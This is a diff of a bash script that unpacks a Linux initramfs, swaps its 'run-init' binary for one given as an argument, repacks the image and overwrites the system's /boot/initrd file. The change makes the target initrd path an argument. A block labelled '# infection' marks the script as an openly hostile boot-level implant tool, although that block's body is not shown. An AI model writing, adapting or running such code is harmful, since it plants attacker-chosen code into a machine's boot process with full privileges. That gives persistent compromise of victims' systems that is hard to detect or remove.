@@ -1,18 +1,25 @@
 #!/bin/bash
 # This script replaces the 'run-init' binary present in
-# the ramdisk image with the one given as argument
+# the given ramdisk image with the one given as argument
 
 programname=$0
 
 function usage {
-    echo -e "\nUsage: $programname <run-init full-path>\n"
+    echo -e "\nUsage: $programname <run-init full-path> <initrd full-path>\n"
     exit 1
 }
 
 # checks if a file is passed as an argument
-if [ $# -eq 0 ]; then
+if [ $# -ne 2 ]; then
         usage
 elif ! [ -f $1 ]; then
+        usage
+elif ! [ -f $2 ]; then
+        usage
+fi
+
+initrd=$2
+if ! [[ $initrd == *"/boot/initrd.img-"* ]]; then
         usage
 fi
 
@@ -21,9 +28,9 @@ mkdir tmp
 mkdir tmp/extracted
 
 # ramdisk unpack
-cp /boot/initrd.img-$(uname -r) tmp/
+cp $initrd tmp/
 cd tmp/
-unmkinitramfs initrd.img-$(uname -r) ./extracted/
+unmkinitramfs $initrd ./extracted/
 cd extracted/
 
 # infection
@@ -40,6 +47,6 @@ find . | cpio --create --format=newc | lz4 -l -c >> /lost+found/tmp/newinitrd
 
 # ramdisk replacement
 cd /lost+found
-rm -f /boot/initrd.img-$(uname -r)
-cp tmp/newinitrd /boot/initrd.img-$(uname -r)
+rm -f $initrd
+cp tmp/newinitrd $initrd
 rm -rf tmp/
